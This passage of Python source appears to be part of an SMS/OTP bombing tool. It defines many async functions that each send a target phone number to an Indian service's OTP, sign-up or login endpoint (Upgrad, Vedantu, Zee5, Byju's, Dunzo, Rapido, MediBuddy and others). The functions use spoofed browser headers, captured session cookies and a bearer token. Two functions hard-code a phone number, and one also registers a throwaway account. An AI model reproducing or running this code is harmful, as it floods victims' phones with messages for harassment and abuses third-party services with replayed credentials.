                async with sess.post('https://api.penpencil.co/v1/users/resend-otp', params=params, headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def upgrade(tarnum: int ):
        try:
            headers = {
                'authority': 'prod-auth-api.upgrad.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json;charset=UTF-8',
                'course': '',
                'origin': 'https://www.upgrad.com',
                'referer': 'https://www.upgrad.com/',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                'utm_campaign': '',
                'utm_content': '',
                'utm_medium': '',
                'utm_source': '',
                'utm_term': '',
            }

            json_data = {
                'phoneNumber': f'+91{tarnum}',
            }
            async with aiohttp.ClientSession() as sess:

                async with sess.post('https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone', headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def vedantu(tarnum: int ):
        try:
            cookies = {
                'LAST_SOURCE_UTMS': '{"utm_campaign":null,"utm_source":"google","utm_medium":"organic","utm_term":null,"utm_content":null}',
                'FIRST_SOURCE_UTMS': '{"utm_campaign":null,"utm_source":"google","utm_medium":"organic","utm_term":null,"utm_content":null}',
                '_gcl_au': '1.1.1801421064.1676750632',
                '_fbp': 'fb.1.1676750632305.1786532008',
                '_uetsid': '5dd410e0afc711ed929ef378d04704a5',
                '_uetvid': '5dd46fc0afc711eda0a1b549c8b1edc2',
                'amp_832ba5': 'URKj3Eld2ax5kQvoBaAYiX...1gpj20d24.1gpj20ebf.3.0.3',
                '_ga_35N6JBZRVC': 'GS1.1.1676750632.1.0.1676750633.59.0.0',
                '_ga': 'GA1.2.569150463.1676750633',
                '_gid': 'GA1.2.1152042693.1676750634',
                'amp_832ba5_vedantu.com': 'URKj3Eld2ax5kQvoBaAYiX...1gpj20d24.1gpj20ggs.4.0.4',
                'auth-token': '8Hq63zA7QQVD8MmU',
            }

            headers = {
                'authority': 'user.vedantu.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                # 'cookie': 'LAST_SOURCE_UTMS={"utm_campaign":null,"utm_source":"google","utm_medium":"organic","utm_term":null,"utm_content":null}; FIRST_SOURCE_UTMS={"utm_campaign":null,"utm_source":"google","utm_medium":"organic","utm_term":null,"utm_content":null}; _gcl_au=1.1.1801421064.1676750632; _fbp=fb.1.1676750632305.1786532008; _uetsid=5dd410e0afc711ed929ef378d04704a5; _uetvid=5dd46fc0afc711eda0a1b549c8b1edc2; amp_832ba5=URKj3Eld2ax5kQvoBaAYiX...1gpj20d24.1gpj20ebf.3.0.3; _ga_35N6JBZRVC=GS1.1.1676750632.1.0.1676750633.59.0.0; _ga=GA1.2.569150463.1676750633; _gid=GA1.2.1152042693.1676750634; amp_832ba5_vedantu.com=URKj3Eld2ax5kQvoBaAYiX...1gpj20d24.1gpj20ggs.4.0.4; auth-token=8Hq63zA7QQVD8MmU',
                'origin': 'https://www.vedantu.com',
                'referer': 'https://www.vedantu.com/',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            }

            json_data = {
                'email': None,
                'phoneCode': '+91',
                'phoneNumber': f'{tarnum}',
                'version': 2,
                'ver': '12.336',
            }
            async with aiohttp.ClientSession() as sess:

                async with sess.post('https://user.vedantu.com/user/preLoginVerification', cookies=cookies, headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def doubtnut(tarnum: int ):
        try:
            headers = {
                'authority': 'api.doubtnut.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.doubtnut.com',
                'referer': 'https://www.doubtnut.com/',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                'version_code': '1500',
            }

            data = f'phone_number={tarnum}&is_web=3'.encode()
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://api.doubtnut.com/v4/student/login', headers=headers, data=data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def zee5(tarnum: int ):
        try:
            headers = {
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Origin': 'https://www.zee5.com',
                'Referer': 'https://www.zee5.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                'device_id': '0afpDz7hZuUJl38J9bWD000000000000',
                'esk': 'MGFmcER6N2hadVVKbDM4SjliV0QwMDAwMDAwMDAwMDBfX2dCUWFaTGlOZEdOOVVzQ0taYWxvZ2h6OXQ5U3RXTFNEX18xNjc2NzU1NDI1ODI3',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            json_data = {
                'phoneno': f'91{tarnum}',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://auth.zee5.com/v1/user/sendotp', headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def ballebazi(tarnum: int ):
        try:
            headers = {
                'authority': 'bbapi.ballebaazi.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJvcHRpb24iOiJndWVzdCIsInR5cGUiOiJhdXRoIiwiaWF0IjoxNjg4ODQwMzIwLCJleHAiOjE2OTMxNjAzMjB9.wFXVjZW6JOtt8V4AW4KUgTwPM_KV0Dalz3x_oUmqhtw',
                'content-type': 'application/json',
                'origin': 'https://www.ballebaazi.com',
                'referer': 'https://www.ballebaazi.com/',
                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            }

            json_data = {
                'phone': f'{tarnum}',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://bbapi.ballebaazi.com/users/applink', headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    async def byjus(tarnum: int ):
        try:
            headers = {
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-mobile': '?0',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                'content-type': 'application/json; charset=utf-8',
                'accept': 'application/json; charset=utf-8',
                'Referer': 'https://byjusexamprep.com/',
                'deviceType': 'web',
            }

            json_data = {
                'tel': f'+91{tarnum}',
                'deviceType': 'web',
            }
            async with aiohttp.ClientSession() as sess:

                async with sess.post('https://webapi.byjusexamprep.com/user/verify/sendOtp', headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def dunzo(tarnum: int ):
        try:
            cookies = {
                'dz_e': 'YTAzOWIzNjMtNDU2MC00NDI1LWJjMjMtNDU5NTM4NTZkOGEwX3Yx',
                'connect.sid': 's%3AJ-kk0fo5a3k_5q21n9c1bP03KbvEqEYm.BnId9YBG52aj3D5X7S4bkTK99V0LgRFjrv7y3kBlfAc',
                '_gcl_au': '1.1.280736843.1676728602',
                '_gid': 'GA1.2.1103936861.1676728602',
                'WZRK_G': '438a8b6b3354443d8c4b2533883f6ebf',
                '_fbp': 'fb.1.1676728602565.1956882044',
                '__cf_bm': 'bSeV_LBqdbJamEYB6Dcv8XtnyO.sMTiA9B4z9qwWmho-1676762323-0-AQyYz/u5BhdtVYzbIRXt9gsAcnrc5kP7v3IXfwTQ/hEoaEarkiULYPjsqKxBMTD1AR5CrDIy35erR1EfTFwgfxI=',
                '__cfruid': '6dbb5c76baae2a6cc72f7216b2b1a1b3aed91b29-1676762323',
                '_gat_UA-74154936-4': '1',
                '_ga': 'GA1.1.563334689.1676728602',
                '_ga_MH9JSX933B': 'GS1.1.1676762173.2.0.1676762173.0.0.0',
                'WZRK_S_46R-KR9-WZ5Z': '%7B%22p%22%3A1%2C%22s%22%3A1676762324%2C%22t%22%3A1676762194%7D',
            }

            headers = {
                'authority': 'www.dunzo.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json;charset=UTF-8',
                # 'cookie': 'dz_e=YTAzOWIzNjMtNDU2MC00NDI1LWJjMjMtNDU5NTM4NTZkOGEwX3Yx; connect.sid=s%3AJ-kk0fo5a3k_5q21n9c1bP03KbvEqEYm.BnId9YBG52aj3D5X7S4bkTK99V0LgRFjrv7y3kBlfAc; _gcl_au=1.1.280736843.1676728602; _gid=GA1.2.1103936861.1676728602; WZRK_G=438a8b6b3354443d8c4b2533883f6ebf; _fbp=fb.1.1676728602565.1956882044; __cf_bm=bSeV_LBqdbJamEYB6Dcv8XtnyO.sMTiA9B4z9qwWmho-1676762323-0-AQyYz/u5BhdtVYzbIRXt9gsAcnrc5kP7v3IXfwTQ/hEoaEarkiULYPjsqKxBMTD1AR5CrDIy35erR1EfTFwgfxI=; __cfruid=6dbb5c76baae2a6cc72f7216b2b1a1b3aed91b29-1676762323; _gat_UA-74154936-4=1; _ga=GA1.1.563334689.1676728602; _ga_MH9JSX933B=GS1.1.1676762173.2.0.1676762173.0.0.0; WZRK_S_46R-KR9-WZ5Z=%7B%22p%22%3A1%2C%22s%22%3A1676762324%2C%22t%22%3A1676762194%7D',
                'correlation-id': '4d805880afe211ed8f1797d73bb0a42f',
                'origin': 'https://www.dunzo.com',
                'referer': 'https://www.dunzo.com/delhi',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'x-app-flavour': '',
                'x-app-type': 'PWA_WEB',
                'x-app-version': '2.0.0',
                'x-csrf-token': 'MCVoy4ET-I18Jva1CJx9lZyB82ZzZ_KwYEoU',
            }

            json_data = {
                'phone': f'{tarnum}',
                'tos_accepted': True,
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.dunzo.com/api/v0/auth/sign-up', cookies=cookies, headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def rapido(tarnum: int ):
        try:
            headers = {
                'authority': 'customer.rapido.bike',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/json',
                'origin': 'https://www.rapido.bike',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
            }

            json_data = {
                'mobile': f'{tarnum}',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://customer.rapido.bike/api/otp', headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    
    async def gopaysense(tarnum: int ):
        try:
            headers = {
                'authority': 'api.gopaysense.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://www.gopaysense.com',
                'referer': 'https://www.gopaysense.com/',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            }

            json_data = {
                'phone': f'{tarnum}',
            }
            async with aiohttp.ClientSession() as sess:

                async with sess.post('https://api.gopaysense.com/users/otp', headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def medibuddy(tarnum: int ):
        try:
            cookies = {
                '_ga': 'GA1.2.1885740090.1677007469',
                '_gid': 'GA1.2.30173405.1677007469',
                '_gac_UA-80666149-1': '1.1677007469.CjwKCAiA9NGfBhBvEiwAq5vSy6ki9bIzV_TjjY2LbJMUfaTc2OKMcwykevSmFbrDBOXgwQdXovQykRoC1iYQAvD_BwE',
                '_gat': '1',
                '_gcl_au': '1.1.1090214670.1677007471',
                '_fbp': 'fb.1.1677007471185.1290031416',
                'WZRK_G': 'c24b8447a298430b9243d3516d158894',
                '_gcl_aw': 'GCL.1677007472.CjwKCAiA9NGfBhBvEiwAq5vSy6ki9bIzV_TjjY2LbJMUfaTc2OKMcwykevSmFbrDBOXgwQdXovQykRoC1iYQAvD_BwE',
                '_opt_utmc': 'SEM%20Brand',
                'WZRK_S_649-47W-Z55Z': '%7B%22p%22%3A1%2C%22s%22%3A1677007624%2C%22t%22%3A1677007478%7D',
            }

            headers = {
                'authority': 'www.medibuddy.in',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                # 'cookie': '_ga=GA1.2.1885740090.1677007469; _gid=GA1.2.30173405.1677007469; _gac_UA-80666149-1=1.1677007469.CjwKCAiA9NGfBhBvEiwAq5vSy6ki9bIzV_TjjY2LbJMUfaTc2OKMcwykevSmFbrDBOXgwQdXovQykRoC1iYQAvD_BwE; _gat=1; _gcl_au=1.1.1090214670.1677007471; _fbp=fb.1.1677007471185.1290031416; WZRK_G=c24b8447a298430b9243d3516d158894; _gcl_aw=GCL.1677007472.CjwKCAiA9NGfBhBvEiwAq5vSy6ki9bIzV_TjjY2LbJMUfaTc2OKMcwykevSmFbrDBOXgwQdXovQykRoC1iYQAvD_BwE; _opt_utmc=SEM%20Brand; WZRK_S_649-47W-Z55Z=%7B%22p%22%3A1%2C%22s%22%3A1677007624%2C%22t%22%3A1677007478%7D',
                'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjMzNjQxNjAiLCJhcCI6IjMyMjU0ODY4NiIsImlkIjoiNWQ0MWQxNDYxZmYwNTQzYSIsInRyIjoiMWEwMDJmZTU4M2E1ODllY2NmYTA3OWIxMDZlZmE3NjAiLCJ0aSI6MTY3NzAwNzQ5MDY3N319',
                'origin': 'https://www.medibuddy.in',
                'referer': 'https://www.medibuddy.in/?$3p=a_google_adwords&$always_deeplink=false&~ad_set_id=138542912373&~campaign_id=17724937809&~channel=g&~keyword=medibuddy&~placement&gclid=CjwKCAiA9NGfBhBvEiwAq5vSy6ki9bIzV_TjjY2LbJMUfaTc2OKMcwykevSmFbrDBOXgwQdXovQykRoC1iYQAvD_BwE&_branch_match_id=1052940192611150823&utm_source=Google%20AdWords&utm_campaign=SEM%20Brand&utm_medium=paid%20advertising&_branch_referrer=H4sIAAAAAAAAAz2OzW6DMBCEnwaOUAwJoRKqgJCqJWlEklbhZBlsjMGAy59Fnr6QQ6U57M6n2Z1iGET%2FqutDTvtRQ0JonDWVvk2OkRQX6nfpmwIsU7gI0ralnECEZdvhXl1sxCWae4gJEWvKzRHvyQqWgacoq%2BDYcbdYXyimp4DDIimlVhPM0hHjWWONqtghwrAnA2TYNczdxgKOAUzbXEmGaoEYbZ7MtoHlmPbuxXmiAjUN4S5dl4rMayv3%2F7JKM75kglJGgcc85%2Bs99wt%2FCpn0fjfTdd5WzEk%2FHj%2FwVpYJOKafp%2B8c3TJwjk6ZnCsyXetD2u39853KGN%2FbKZ6rSxsYLIm9aQ99Gf4BUc806ToBAAA%3D',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'traceparent': '00-1a002fe583a589eccfa079b106efa760-5d41d1461ff0543a-01',
                'tracestate': '3364160@nr=0-1-3364160-322548686-5d41d1461ff0543a----1677007490677',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            }

            json_data = {
                'source': 'medibuddy',
                'platform': 'medibuddyInWeb',
                'phonenumber': f'{tarnum}',
                'screen': 'login-page',
                'advertiserId': '1052940192611150823',
                'mbUserId': None,
            }
            async with aiohttp.ClientSession() as sess:

                async with sess.post('https://www.medibuddy.in/unified-login/user/register', cookies=cookies, headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def moglix(tarnum: int ):
        try:
            headers = {
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE',
                'Content-Type': 'application/json',
                'Accept': 'application/json, text/plain, */*',
                'Referer': '',
                'x-access-token': '',
                'x-request-id': '9KBqSaqWkg5-odqZr1bAAbpYcJDDtI98',
                'sec-ch-ua-platform': '"Windows"',
            }

            json_data = {
                'phone': f'{tarnum}',
                'email': '',
                'type': 'p',
                'source': 'signup',
                'device': 'mobile',
            }
            async with aiohttp.ClientSession() as sess:

                async with sess.get('https://apinew.moglix.com/nodeApi/v1/login/sendOTP', headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def Xtracover(tarnum: int):
        try:
            cookies = {
                '_gcl_au': '1.1.437252216.1686488607',
                'XcCart': 'rntljjxihtxmt5gmwlx55d4p',
                '_fbp': 'fb.1.1686488607618.1734074002',
                '_hjSessionUser_2540939': 'eyJpZCI6ImY1ZWM4MzE0LTJhYzItNTMzZi1iNzk2LTMyOGM3YzAxNzc2ZiIsImNyZWF0ZWQiOjE2ODY0ODg2MDg0NDksImV4aXN0aW5nIjp0cnVlfQ==',
                'ASP.NET_SessionId': 'lypcjzops3h0ealvoro3i3zs',
                'tcl54JDWDWFWEFDFJ2142DSAFD': 'pdXWe0QVjAm3G0wRTUIvz3xzd0GP/KpNktWNcczoyD9/drOB5S7JumenV4dEO52gtv6V4sTngO8Gpmh7tb1Mgy+FqNZmWZp2GHDlF+2/Y7X15LZNA8HhirzH4prX4/xfZmdP/F4O7y3d7aOkpjh5OqRFYaO74ug6hI0ycRy+7lYou9nsmG0z9blBw8qdDF1IJNTWjp0Kzv60GUEsQYenQxv8lK/3mHOmG4N+ZbFTjiTd0r7xjwYZb1ClbCoMt2gOLT1PgCl2fx9umqmtLtVW+w==',
                'tct54JDWDWFWEFDFJ2142DSAFD': 'pdXWe0QVjAm3G0wRTUIvz3xzd0GP/KpNktWNcczoyD82LpfEVMpy1b0VEqjnO/p9WvY2S2HcAS7VuNYBqtNEyGx3Q9uPgxvXeaWNjAKyj65YB32413jWTyVuONFSLx9v/0Yn9mk9oxmC73TiScIRzykLbfQu2QZ9xijcH2D5mil+HAj+JgJcXTNyRMMnbyW4L2xgoE5culelKW/M39JngUWuJ6qOSz35neDQlGALMh8=',
                '_gid': 'GA1.2.555995201.1688926130',
                '_gat_gtag_UA_175427683_1': '1',
                '_clck': '10x2wrd|2|fd5|0|1257',
                '_hjIncludedInSessionSample_2540939': '0',
                '_hjSession_2540939': 'eyJpZCI6IjlmNzNjMTBmLWNkYWItNGRjYS04NTVkLTQ3OGU0OTczZDZkZiIsImNyZWF0ZWQiOjE2ODg5MjYxMzQ2NzgsImluU2FtcGxlIjpmYWxzZX0=',
                '_hjAbsoluteSessionInProgress': '0',
                '_ga_PVWZVW9QBM': 'GS1.1.1688926130.2.1.1688926141.49.0.0',
                '_ga': 'GA1.1.1981712338.1686488607',
                '_ga_4RW6VRZC6Z': 'GS1.1.1688926130.1.1.1688926141.49.0.0',
                '_clsk': '1xy9yxu|1688926142905|2|1|y.clarity.ms/collect',
            }

            headers = {
                'authority': 'www.xtracover.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'cookie': '_gcl_au=1.1.437252216.1686488607; XcCart=rntljjxihtxmt5gmwlx55d4p; _fbp=fb.1.1686488607618.1734074002; _hjSessionUser_2540939=eyJpZCI6ImY1ZWM4MzE0LTJhYzItNTMzZi1iNzk2LTMyOGM3YzAxNzc2ZiIsImNyZWF0ZWQiOjE2ODY0ODg2MDg0NDksImV4aXN0aW5nIjp0cnVlfQ==; ASP.NET_SessionId=lypcjzops3h0ealvoro3i3zs; tcl54JDWDWFWEFDFJ2142DSAFD=pdXWe0QVjAm3G0wRTUIvz3xzd0GP/KpNktWNcczoyD9/drOB5S7JumenV4dEO52gtv6V4sTngO8Gpmh7tb1Mgy+FqNZmWZp2GHDlF+2/Y7X15LZNA8HhirzH4prX4/xfZmdP/F4O7y3d7aOkpjh5OqRFYaO74ug6hI0ycRy+7lYou9nsmG0z9blBw8qdDF1IJNTWjp0Kzv60GUEsQYenQxv8lK/3mHOmG4N+ZbFTjiTd0r7xjwYZb1ClbCoMt2gOLT1PgCl2fx9umqmtLtVW+w==; tct54JDWDWFWEFDFJ2142DSAFD=pdXWe0QVjAm3G0wRTUIvz3xzd0GP/KpNktWNcczoyD82LpfEVMpy1b0VEqjnO/p9WvY2S2HcAS7VuNYBqtNEyGx3Q9uPgxvXeaWNjAKyj65YB32413jWTyVuONFSLx9v/0Yn9mk9oxmC73TiScIRzykLbfQu2QZ9xijcH2D5mil+HAj+JgJcXTNyRMMnbyW4L2xgoE5culelKW/M39JngUWuJ6qOSz35neDQlGALMh8=; _gid=GA1.2.555995201.1688926130; _gat_gtag_UA_175427683_1=1; _clck=10x2wrd|2|fd5|0|1257; _hjIncludedInSessionSample_2540939=0; _hjSession_2540939=eyJpZCI6IjlmNzNjMTBmLWNkYWItNGRjYS04NTVkLTQ3OGU0OTczZDZkZiIsImNyZWF0ZWQiOjE2ODg5MjYxMzQ2NzgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _ga_PVWZVW9QBM=GS1.1.1688926130.2.1.1688926141.49.0.0; _ga=GA1.1.1981712338.1686488607; _ga_4RW6VRZC6Z=GS1.1.1688926130.1.1.1688926141.49.0.0; _clsk=1xy9yxu|1688926142905|2|1|y.clarity.ms/collect',
                'origin': 'https://www.xtracover.com',
                'referer': 'https://www.xtracover.com/CustomerLogin',
                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            data = {
                'mobileno': '9990212082',
                'IsCheckOutUsedSystemOtp': '0',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.xtracover.com/MyAccount/GetOtpByMobileNo', cookies=cookies, headers=headers, data=data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def mgy(tarnum: int):
        try:
            cookies = {
                'sid_customer_d203b': 'db6234fd2a4f829d94d352315c9614fc-1-C',
                '_vwo_uuid_v2': 'D443946B37BD36505CF9ABFEEE4617756|c0c9a3457cf7f11c0ac76d64749d5f6f',
                '_gcl_au': '1.1.1542016687.1688926663',
                '_ga': 'GA1.1.2014603452.1688926663',
                '_fbp': 'fb.1.1688926662954.851631705',
                '_clck': '1x6t56i|2|fd5|0|1285',
                '_clsk': '15tadag|1688926686104|1|1|b.clarity.ms/collect',
                '_ga_R3SNBE5CG8': 'GS1.1.1688926662.1.1.1688926713.9.0.0',
            }

            headers = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'Cookie': 'sid_customer_d203b=db6234fd2a4f829d94d352315c9614fc-1-C; _vwo_uuid_v2=D443946B37BD36505CF9ABFEEE4617756|c0c9a3457cf7f11c0ac76d64749d5f6f; _gcl_au=1.1.1542016687.1688926663; _ga=GA1.1.2014603452.1688926663; _fbp=fb.1.1688926662954.851631705; _clck=1x6t56i|2|fd5|0|1285; _clsk=15tadag|1688926686104|1|1|b.clarity.ms/collect; _ga_R3SNBE5CG8=GS1.1.1688926662.1.1.1688926713.9.0.0',
                'Origin': 'https://www.myg.in',
                'Referer': 'https://www.myg.in/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            params = {
                'dispatch': 'fk_login.register',
            }

            data = {
                'ship_to_another': '1',
                'user_data[firstname]': 'bhjbshjvb',
                'user_data[lastname]': 'cmsv  v',
                'user_data[phone]': '9990212082',
                'user_data[email]': 'ndnvnf@gmail.com',
                'user_data[password1]': '17074502',
                'user_data[password2]': '17074502',
                'security_hash': '53228cf784793b1d89cfb22875c9c530',
                'is_ajax': '1',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.myg.in/index.php', params=params, cookies=cookies, headers=headers, data=data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def flyphone(tarnum: int):
        try:
            cookies = {
                'webtype': 'undefined',
                'googtrans': '/en/en',
                'googtrans': '/en/en',
                'NSSESSION': 's%3A5F3M9bQxPYwjWs6sccTs7kELDQ0ymZoS.D9vpeOjw%2BSz5YpqWTB7BZadYQASgBBiG9QYGSqz8q50',
                'PHPWEBSTORESESSION': '5F3M9bQxPYwjWs6sccTs7kELDQ0ymZoS',
                'twk_idm_key': 'a93bTn7z3Qzoos1T_rgPs',
                'TawkConnectionTime': '0',
                'twk_uuid_61268648649e0a0a5cd2eea9': '%7B%22uuid%22%3A%221.SwpLLChOGslHzfjvXF5GksFDS6RycfQKwS0P7bSLHLnW6nLf1NgcYi7V4hVqcBhc66wPveCNJlrIhm966EgS3ww653IVUmCWIn1ukTOysDY2HvAvbb6IC%22%2C%22version%22%3A3%2C%22domain%22%3A%22flyphones.in%22%2C%22ts%22%3A1688927126119%7D',
            }

            headers = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
